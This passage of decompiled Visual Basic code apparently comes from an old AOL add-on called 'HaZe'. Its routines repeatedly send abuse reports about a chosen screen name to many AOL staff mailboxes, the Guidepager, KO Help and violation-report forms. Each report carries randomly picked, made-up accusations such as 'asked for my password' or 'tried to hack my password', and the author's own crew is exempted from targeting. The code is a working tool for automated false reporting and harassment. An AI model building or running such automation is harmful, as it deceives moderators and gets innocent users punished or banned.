sub30B0 "•-^v•HaZe-X²·³ [gold] • Secret TOS Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "TOSDonC"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • Secret TOS2 Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "TROUBLE"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TROUBLE Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "TOSIRC"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSIRC Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "VLA"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • VLA Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "CGU France"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • CGU France Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "COSRoomsDE"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • COSRoomsDE Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "LOTSEN HO"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • LOTSEN HO Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "Lotsen ON"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • LOTSEN ON Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "LOTSEN AM"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • LOTSEN AM Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
l12A2 = extfn1520("AOL Frame25", 0&)
Call subD08("INVOKE DATABASE RECORD", "*")
Do
DoEvents
l1394 = extfn24E0(l12A2, "INVOKE DATABASE RECORD")
DoEvents
Loop Until l1394 <> 0
l1398 = extfn2518(l1394, "_AOL_Icon")
l1380 = extfn2518(l1394, "_AOL_Edit")
l139C = extfn1718(l1380, c07E6, 0, "40-22620")
subF38 .3#
l13A0 = extfn24E0(l1288%, "Invoke Database Record")
l13A4 = extfn2518(l13A0, "_AOL_Button")
l13A8 = extfn24E0(l13A4, "OK")
subF38 .5#
l13AC = extfn1750(l13A4, c0074, 0, 0&)
l13AC = extfn1750(l13A4, c007C, 0, 0&)
subF38 .1#
l13B0% = extfn24E0(l1288%, "INVOKE DATABASE RECORD")
l12A8 = extfn1750(l13B0%, c022E, 0, 0)
subF38 .9#
Do
DoEvents
l13B2% = extfn24E0(l1288%, "GUIDEPAGER FOR STAFF MEMBERS")
Loop Until l13B2% > 0
l13B4 = extfn24E0(l1288%, "guidepager for staff members")
l13B8 = fn5D0(l136E(), l13B4, "*", "_AOL_Icon", Null)
l13BC = l136E(3)
l138C = extfn1750(l13BC, c0074, 0, 0&)
l1390 = extfn1750(l13BC, c007C, 0, 0&)
subF38 .1#
l12A6% = extfn24E0(l1288%, "GUIDEPAGER FOR STAFF MEMBERS")
l12A8 = extfn1750(l12A6%, c022E, 0, 0)
DoEvents
l13C2% = extfn1750(l13C0%, c0074, 0, 0&)
l13C2% = extfn1750(l13C0%, c007C, 0, 0&)
subF38 .1#
Do
DoEvents
l13C4% = extfn24E0(l1288%, "Report Password Solicitations")
Loop Until l13C4% > 0
subF38 .1#
l12A6% = extfn24E0(l1288%, "GUIDEPAGER FOR STAFF MEMBERS")
l12A8 = extfn1750(l12A6%, c022E, 0, 0)
l12B4 = extfn2518(l1288%, "_AOL_edit")
l12B8 = extfn14E8(l12B4, c0810)
l12BC = extfn14E8(l12B8, c0810)
l12C0 = extfn14E8(l12BC, c0810)
l12C4 = extfn14E8(l12C0, c0810)
l12C8 = extfn14E8(l12C4, c0810)
l12CC = extfn14E8(l12C8, c0810)
l12D0 = extfn14E8(l12CC, c0810)
l12D4 = extfn14E8(l12D0, c0810)
l12D8 = extfn1718(l12CC, c07E6, 0, Room)
l12DC$ = Chr(10)
l12D8 = extfn1718(l12D4, c07E6, 0, Room + ":" & " " & "" & Text1 & l12DC$ & l12DC$)
subF38 .3#
l1296 = extfn16E0(l12CC, c0218, 13, 0)
subF38 .7#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • Staffpager Completed."
subF38 .3#
sub30B0 "•-^v•HaZe-X²·³ [gold] • Supreme TOS Completed."
Call sub3208
For l13C6 = 0 To Combo1.ListCount
l13CA$ = Combo1.List(l13C6)
If  Room = l13CA$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub supreme1_Click ()
Dim l13CC As Integer
Dim l13CE As Variant
Dim l13D2 As Variant
Dim l13D6 As Variant
Dim l13DA As Variant
Dim l13DE As Integer
Dim l13E0 As Variant
Dim l13E4 As Integer
Dim l13E6 As Variant
Dim l13EA As Integer
Dim l13EC As Variant
Dim l13F0 As Variant
Dim l13F4 As Variant
Dim l13F8 As Variant
Dim l13FC As Variant
Dim l1400 As Variant
Dim l1404 As Variant
Dim l1408 As Variant
Dim l140C As Variant
Dim l1410 As Variant
Dim l1414 As Variant
Dim l1418 As Variant
Dim l141C As Variant
Dim l1420 As String
Dim l1422 As Integer
Dim l1424 As Variant
Dim l1428 As Variant
Dim l142C As Variant
Dim l1430 As Variant
Dim l1434 As Variant
Dim l1438 As String
Dim l143A As Integer
Dim l143C As Variant
Dim l1440 As Variant
Dim l1444 As Variant
Dim l1448 As Variant
Dim l144C As Variant
Dim l1450 As Variant
Dim l1454 As Variant
Dim l1458 As Variant
Dim l145C As Variant
Dim l1460 As Variant
Dim l1464 As Variant
Dim l1468 As Variant
Dim l146C As Variant
Dim l1470 As Variant
Dim l1474 As Variant
Dim l1478 As Variant
Dim l147C As Variant
Dim l1480 As Variant
Dim l1484 As Variant
Dim l1488 As Variant
Dim l148C As Variant
Dim l1490 As Variant
Dim l1494 As Variant
Dim l1498 As Variant
Dim l149C As Variant
Dim l14A0 As Variant
Dim l14A4 As Variant
Dim l14A8 As Variant
Dim l14AC As String
Dim l14AE As Variant
Dim l14B2() As Integer
Dim l14B8 As Variant
Dim l14BC As Variant
Dim l14C0 As Variant
Dim l14C4 As Variant
Dim l14C8 As Variant
Dim l14CC As Variant
Dim l14D0 As Variant
Dim l14D4 As Variant
Dim l14D8 As Variant
Dim l14DC As Variant
Dim l14E0 As Variant
Dim l14E4 As Variant
Dim l14E8 As Variant
Dim l14EC As Variant
Dim l14F0 As Variant
Dim l14F4 As Integer
Dim l14F6 As Integer
Dim l14F8 As Variant
Dim l14FC As Variant
Dim l1500 As Variant
Dim l1504 As Integer
Dim l1506 As Integer
Dim l1508 As Integer
Dim l150A As Variant
Dim l150E As String
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • Supreme TOS"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
l13CC% = extfn1520("AOL Frame25", 0&)
Call subD08("Keyword...", "&Go To")
Do
DoEvents
l13CE = extfn24E0(l13CC%, "Keyword")
Loop Until l13CE <> 0
l13D2 = extfn2518(l13CE, "_AOL_Edit")
l13D6 = extfn1718(l13D2, c07E6, 0, "GUIDEPAGER")
l13DA = extfn16E0(l13D2, c0218, 13, 0)
Do
DoEvents
l13DE% = extfn1520("AOL Frame25", 0&)
l13E0 = extfn24E0(l13DE%, "I Need Help!")
Loop Until l13E0 > 0
l13E4% = extfn2518(l13E0, "_AOL_ICON")
l13E6 = extfn1750(l13E4%, c0074, 0, 0)
l13E6 = extfn1750(l13E4%, c007C, 0, 0)
subF38 .1#
l13EA% = extfn24E0(l13CC%, "I Need Help!")
l13EC = extfn16E0(l13EA%, c022E, 0, 0)
Do
DoEvents
l13F0 = extfn24E0(l13CC%, "Report Password Solicitations")
Loop Until l13F0 <> 0
l13D6 = extfn16E0(l13F4, c022E, 0, 0)
l13F8 = extfn2518(l13CC%, "_AOL_Edit")
l13FC = extfn14E8(l13F8, c0810)
l1400 = extfn14E8(l13FC, c0810)
l1404 = extfn14E8(l1400, c0810)
l1408 = extfn14E8(l1404, c0810)
l140C = extfn14E8(l1408, c0810)
l1410 = extfn14E8(l140C, c0810)
l1414 = extfn14E8(l1410, c0810)
l1418 = extfn14E8(l1414, c0810)
l141C = extfn1718(l1410, c07E6, 0, Room)
l1420$ = Chr(10)
l141C = extfn1718(l1418, c07E6, 0, Room + ":" & " " & "" & Text1 & l1420$ & l1420$)
subF38 .3#
l13DA = extfn16E0(l1410, c0218, 13, 0)
subF38 .5#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • Guidepager Completed"
subF38 .3#
l13CC% = extfn1520("AOL Frame25", 0&)
Call subD08("Keyword...", "&Go To")
Do
DoEvents
l13CE = extfn24E0(l13CC%, "Keyword")
Loop Until l13CE <> 0
l13D2 = extfn2518(l13CE, "_AOL_Edit")
l13D6 = extfn1718(l13D2, c07E6, 0, "KO HELP")
l13DA = extfn16E0(l13D2, c0218, 13, 0)
Do
DoEvents
l13DE% = extfn1520("AOL Frame25", 0&)
l13E0 = extfn24E0(l13DE%, "I Need Help!")
Loop Until l13E0 > 0
l13E4% = extfn2518(l13E0, "_AOL_ICON")
l13E6 = extfn1750(l13E4%, c0074, 0, 0)
l13E6 = extfn1750(l13E4%, c007C, 0, 0)
subF38 .1#
l13EA% = extfn24E0(l13CC%, "I Need Help!")
l13EC = extfn16E0(l13EA%, c022E, 0, 0)
Do
DoEvents
l1422% = extfn24E0(l13CC%, "Report Password Solicitations")
Loop Until l1422% > 0
l1428 = extfn16E0(l1424, c022E, 0, 0)
l13F8 = extfn2518(l13CC%, "_AOL_edit")
l13FC = extfn14E8(l13F8, c0810)
l1400 = extfn14E8(l13FC, c0810)
l1404 = extfn14E8(l1400, c0810)
l1408 = extfn14E8(l1404, c0810)
l140C = extfn14E8(l1408, c0810)
l1410 = extfn14E8(l140C, c0810)
l1414 = extfn14E8(l1410, c0810)
l1418 = extfn14E8(l1414, c0810)
l13EC = extfn1718(l1408, c07E6, 0, Room)
l13EC = extfn1718(l1410, c07E6, 0, Room + ":" & " " & "" & Text1 & Chr(10))
subF38 .3#
l13DA = extfn16E0(l1414, c0218, 13, 0)
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • New KO Help Completed"
subF38 .3#
Randomize
For l142C = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l1430 = 6
    l1434 = Int(Rnd * l1430 + 1)
      If  l1434 = 1 Then l1438$ = "17"
      If  l1434 = 2 Then l1438$ = "2"
      If  l1434 = 3 Then l1438$ = "72"
      If  l1434 = 4 Then l1438$ = "53"
      If  l1434 = 5 Then l1438$ = "45"
      If  l1434 = 6 Then l1438$ = "11"
      If  l1434 = 7 Then l1438$ = "65"
      Next
Call subD08("Keyword...", "&Go To")
l143A% = extfn1520("AOL Frame25", 0&)
Do
DoEvents
l143C = extfn24E0(l143A%, "Keyword")
Loop Until l143C <> 0
l1440 = extfn2518(l143C, "_AOL_Edit")
l1444 = extfn1718(l1440, c07E6, 0, "Guidepager")
l1448 = extfn16E0(l1440, c0218, 13, 0)
Do
DoEvents
l144C = extfn24E0(l143A%, "I Need Help!")
Loop Until l144C <> 0
l1450 = extfn2518(l144C, "_AOL_Icon")
l1454 = extfn13D0(l1450, 2)
l1458 = extfn13D0(l1454, 2)
l145C = extfn13D0(l1458, 2)
l1460 = extfn13D0(l145C, 2)
l1464 = extfn1750(l1458, c0074, 0, 0&)
l1468 = extfn1750(l1458, c007C, 0, 0&)
subF38 .1#
l13EA% = extfn24E0(l13CC%, "I Need Help!")
Do
DoEvents
l146C = extfn24E0(l143A%, "Report A Violation")
Loop Until l146C <> 0
l1470 = extfn2518(10634, "_AOL_Icon")
SendKeys "{tab}" & " "
l13EC = extfn16E0(l13EA%, c022E, 0, 0)
l1474 = extfn16E0(10634, c022E, 0, 0)
Do
DoEvents
l1478 = extfn24E0(l143A%, "Violations via instant Messages")
Loop Until l1478 <> 0
subF38 .1#
l13EA% = extfn24E0(l13CC%, "Report A Violation")
l13EC = extfn16E0(l13EA%, c022E, 0, 0)
l1440 = extfn2518(l1478, "_AOL_Edit")
l147C = extfn13D0(l1440, 2)
l1480 = extfn13D0(l147C, 2)
l1484 = extfn13D0(l1480, 2)
l1488 = extfn13D0(l1484, 2)
l148C = extfn13D0(l1488, 2)
l1490 = extfn13D0(l148C, 2)
l1494 = extfn13D0(l1490, 2)
l1498 = extfn13D0(l1494, 2)
l1444 = extfn1718(l1440, c07E6, 0, Date)
l1444 = extfn1718(l1480, c07E6, 0, Time)
l1444 = extfn1718(l1488, c07E6, 0, Room + ":" & " " & Text1 & Chr(10))
subF38 .3#
l149C = extfn2518(l1478, "_AOL_Button")
l1464 = extfn1750(l149C, c0074, 0, 0&)
l1468 = extfn1750(l149C, c007C, 0, 0&)
l14A0 = extfn16E0(l1478, c022E, 0, 0)
l14A0 = extfn16E0(l144C, c022E, 0, 0)
l14A0 = extfn16E0(l146C, c022E, 0, 0)
sub30B0 "•-^v•HaZe-X²·³ [gold] • IM Violation Complete"
subF38 .3#
Randomize
For l142C = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l14A4 = 6
    l14A8 = Int(Rnd * l14A4 + 1)
      If  l14A8 = 1 Then l14AC$ = "" & Form1.Room & " asked for my password."
      If  l14A8 = 2 Then l14AC$ = "" & Form1.Room & " tried to hack my password."
      If  l14A8 = 3 Then l14AC$ = "Read!" & Form1.Room & " asked for my password."
      If  l14A8 = 4 Then l14AC$ = "Please do something about " & Form1.Room & "."
      If  l14A8 = 5 Then l14AC$ = "This guy wants my password:" & Form1.Room
      If  l14A8 = 6 Then l14AC$ = "Please help " & Form1.Room & " wants my password."
      If  l14A8 = 7 Then l14AC$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l14AE) Like "*KaOS*" Or UCase$(l14AE) Like "*NiPP*" Or UCase$(l14AE) Like "*CHOP*" Or UCase$(l14AE) Like "*LoRe*" Or UCase$(l14AE) Like "*CouNT*" Or UCase$(l14AE) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
l13CC% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l14B8 = extfn24E0(l13CC%, "Compose Mail")
DoEvents
Loop Until l14B8 <> 0
l14BC = fn5D0(l14B2(), l14B8, "*", "_AOL_Edit", Null)
subF00 l14B2(1), "TOSEmail2"
subF00 l14B2(3), "" & l14AC$
l1420$ = Chr(10)
subF00 l14B2(4), "" & Room & ":" & " " & "" & Text1 & l1420$ & l1420$
l14C0 = extfn24E0(l14B8, "Send")
l14C4 = extfn2518(l14B8, "_AOL_Icon")
l14C8 = extfn13D0(l14C4, 2)
l14CC = extfn13D0(l14C8, 2)
l14D0 = extfn1750(l14C4, c0074, 0, 0&)
l14D4 = extfn1750(l14C4, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSEmail2 Completed."
subF38 .3#
l13CC% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l14B8 = extfn24E0(l13CC%, "Compose Mail")
DoEvents
Loop Until l14B8 <> 0
l14BC = fn5D0(l14B2(), l14B8, "*", "_AOL_Edit", Null)
subF00 l14B2(1), "TOSEmail3"
subF00 l14B2(3), "" & l14AC$
l1420$ = Chr(10)
subF00 l14B2(4), "" & Room & ":" & " " & "" & Text1 & l1420$ & l1420$
l14C0 = extfn24E0(l14B8, "Send")
l14C4 = extfn2518(l14B8, "_AOL_Icon")
l14C8 = extfn13D0(l14C4, 2)
l14CC = extfn13D0(l14C8, 2)
l14D0 = extfn1750(l14C4, c0074, 0, 0&)
l14D4 = extfn1750(l14C4, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSEmail3 Completed."
subF38 .3#
l13CC% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l14B8 = extfn24E0(l13CC%, "Compose Mail")
DoEvents
Loop Until l14B8 <> 0
l14BC = fn5D0(l14B2(), l14B8, "*", "_AOL_Edit", Null)
subF00 l14B2(1), "TOSFileWrn"
subF00 l14B2(3), "" & l14AC$
l1420$ = Chr(10)
subF00 l14B2(4), "" & Room & ":" & " " & "" & Text1 & l1420$ & l1420$
l14C0 = extfn24E0(l14B8, "Send")
l14C4 = extfn2518(l14B8, "_AOL_Icon")
l14C8 = extfn13D0(l14C4, 2)
l14CC = extfn13D0(l14C8, 2)
l14D0 = extfn1750(l14C4, c0074, 0, 0&)
l14D4 = extfn1750(l14C4, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSFileWrn Completed."
subF38 .3#
l13CC% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l14B8 = extfn24E0(l13CC%, "Compose Mail")
DoEvents
Loop Until l14B8 <> 0
l14BC = fn5D0(l14B2(), l14B8, "*", "_AOL_Edit", Null)
subF00 l14B2(1), "TOSFiles1"
subF00 l14B2(3), "" & l14AC$
l1420$ = Chr(10)
subF00 l14B2(4), "" & Room & ":" & " " & "" & Text1 & l1420$ & l1420$
l14C0 = extfn24E0(l14B8, "Send")
l14C4 = extfn2518(l14B8, "_AOL_Icon")
l14C8 = extfn13D0(l14C4, 2)
l14CC = extfn13D0(l14C8, 2)
l14D0 = extfn1750(l14C4, c0074, 0, 0&)
l14D4 = extfn1750(l14C4, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSFiles1 Completed."
subF38 .3#
l13CC% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l14B8 = extfn24E0(l13CC%, "Compose Mail")
DoEvents
Loop Until l14B8 <> 0
l14BC = fn5D0(l14B2(), l14B8, "*", "_AOL_Edit", Null)
subF00 l14B2(1), "TOS IM1"
subF00 l14B2(3), "" & l14AC$
l1420$ = Chr(10)
subF00 l14B2(4), "" & Room & ":" & " " & "" & Text1 & l1420$ & l1420$
l14C0 = extfn24E0(l14B8, "Send")
l14C4 = extfn2518(l14B8, "_AOL_Icon")
l14C8 = extfn13D0(l14C4, 2)
l14CC = extfn13D0(l14C8, 2)
l14D0 = extfn1750(l14C4, c0074, 0, 0&)
l14D4 = extfn1750(l14C4, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOS IM1 Completed."
subF38 .3#
l13CC% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l14B8 = extfn24E0(l13CC%, "Compose Mail")
DoEvents
Loop Until l14B8 <> 0
l14BC = fn5D0(l14B2(), l14B8, "*", "_AOL_Edit", Null)
subF00 l14B2(1), "TOSStaff1"
subF00 l14B2(3), "" & l14AC$
l1420$ = Chr(10)
subF00 l14B2(4), "" & Room & ":" & " " & "" & Text1 & l1420$ & l1420$
l14C0 = extfn24E0(l14B8, "Send")
l14C4 = extfn2518(l14B8, "_AOL_Icon")
l14C8 = extfn13D0(l14C4, 2)
l14CC = extfn13D0(l14C8, 2)
l14D0 = extfn1750(l14C4, c0074, 0, 0&)
l14D4 = extfn1750(l14C4, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSStaff1 Completed."
subF38 .3#
l13CC% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l14B8 = extfn24E0(l13CC%, "Compose Mail")
DoEvents
Loop Until l14B8 <> 0
l14BC = fn5D0(l14B2(), l14B8, "*", "_AOL_Edit", Null)
subF00 l14B2(1), "TOSBoards1"
subF00 l14B2(3), "" & l14AC$
l1420$ = Chr(10)
subF00 l14B2(4), "" & Room & ":" & " " & "" & Text1 & l1420$ & l1420$
l14C0 = extfn24E0(l14B8, "Send")
l14C4 = extfn2518(l14B8, "_AOL_Icon")
l14C8 = extfn13D0(l14C4, 2)
l14CC = extfn13D0(l14C8, 2)
l14D0 = extfn1750(l14C4, c0074, 0, 0&)
l14D4 = extfn1750(l14C4, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSBoards1 Completed."
subF38 .3#
l13CC% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l14B8 = extfn24E0(l13CC%, "Compose Mail")
DoEvents
Loop Until l14B8 <> 0
l14BC = fn5D0(l14B2(), l14B8, "*", "_AOL_Edit", Null)
subF00 l14B2(1), "TOSNames1"
subF00 l14B2(3), "" & l14AC$
l1420$ = Chr(10)
subF00 l14B2(4), "" & Room & ":" & " " & "" & Text1 & l1420$ & l1420$
l14C0 = extfn24E0(l14B8, "Send")
l14C4 = extfn2518(l14B8, "_AOL_Icon")
l14C8 = extfn13D0(l14C4, 2)
l14CC = extfn13D0(l14C8, 2)
l14D0 = extfn1750(l14C4, c0074, 0, 0&)
l14D4 = extfn1750(l14C4, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSNames1 Completed."
subF38 .3#
l13CC% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l14B8 = extfn24E0(l13CC%, "Compose Mail")
DoEvents
Loop Until l14B8 <> 0
l14BC = fn5D0(l14B2(), l14B8, "*", "_AOL_Edit", Null)
subF00 l14B2(1), "TROUBLE"
subF00 l14B2(3), "" & l14AC$
l1420$ = Chr(10)
subF00 l14B2(4), "" & Room & ":" & " " & "" & Text1 & l1420$ & l1420$
l14C0 = extfn24E0(l14B8, "Send")
l14C4 = extfn2518(l14B8, "_AOL_Icon")
l14C8 = extfn13D0(l14C4, 2)
l14CC = extfn13D0(l14C8, 2)
l14D0 = extfn1750(l14C4, c0074, 0, 0&)
l14D4 = extfn1750(l14C4, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TROUBLE Completed."
subF38 .3#
l13CC% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l14B8 = extfn24E0(l13CC%, "Compose Mail")
DoEvents
Loop Until l14B8 <> 0
l14BC = fn5D0(l14B2(), l14B8, "*", "_AOL_Edit", Null)
subF00 l14B2(1), "TOSIRC"
subF00 l14B2(3), "" & l14AC$
l1420$ = Chr(10)
subF00 l14B2(4), "" & Room & ":" & " " & "" & Text1 & l1420$ & l1420$
l14C0 = extfn24E0(l14B8, "Send")
l14C4 = extfn2518(l14B8, "_AOL_Icon")
l14C8 = extfn13D0(l14C4, 2)
l14CC = extfn13D0(l14C8, 2)
l14D0 = extfn1750(l14C4, c0074, 0, 0&)
l14D4 = extfn1750(l14C4, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSIRC Completed."
subF38 .3#
l13CC% = extfn1520("AOL Frame25", 0&)
l13E6 = extfn1520("AOL Frame25", 0&)
Call subD08("INVOKE DATABASE RECORD", "*")
Do
DoEvents
l14D8 = extfn24E0(l13E6, "INVOKE DATABASE RECORD")
DoEvents
Loop Until l14D8 <> 0
l14DC = extfn2518(l14D8, "_AOL_Icon")
l14C4 = extfn2518(l14D8, "_AOL_Edit")
